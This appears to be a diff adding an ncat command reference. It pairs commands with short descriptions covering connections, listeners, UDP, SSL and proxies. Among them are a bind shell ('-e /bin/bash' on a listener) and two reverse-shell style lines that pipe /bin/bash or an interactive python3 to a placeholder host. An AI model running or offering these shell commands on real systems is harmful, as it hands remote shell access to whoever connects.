@@ -1,0 +1,55 @@
+[X] Ncat Command List (Nmap Netcat Replacement)
+
+[\] ncat example.com 80
+[/] Connect to remote host on port 80
+
+[\] ncat -l 1234
+[/] Listen on local port 1234
+
+[\] ncat -l 1234 --keep-open
+[/] Keep listening after client disconnects
+
+[\] ncat -l 1234 -k -e /bin/bash
+[/] Bind shell (dangerous, testing only)
+
+[\] ncat -u example.com 5000
+[/] Connect via UDP to host
+
+[\] ncat -u -l 5000
+[/] Listen for UDP connections
+
+[\] ncat -v example.com 80
+[/] Verbose output (show connection info)
+
+[\] ncat -vv example.com 80
+[/] Extra verbose output
+
+[\] ncat --ssl example.com 443
+[/] Connect using SSL/TLS
+
+[\] ncat --ssl --listen 443 -k
+[/] SSL/TLS server, keep listening
+
+[\] ncat --recv-only -l 1234
+[/] Only receive data, no send
+
+[\] ncat --send-only example.com 1234
+[/] Only send data, no receive
+
+[\] ncat --zero example.com 1234
+[/] Send null bytes (testing)
+
+[\] ncat --exec /bin/bash example.com 1234
+[/] Execute command remotely
+
+[\] ncat --sh-exec "/usr/bin/python3 -i" example.com 1234
+[/] Execute shell/command remotely
+
+[\] ncat --proxy proxyhost:1080 --proxy-type socks5 example.com 80
+[/] Connect via SOCKS5 proxy
+
+[\] ncat --help
+[/] Show help menu
+
+[\] ncat --version
+[/] Show ncat version
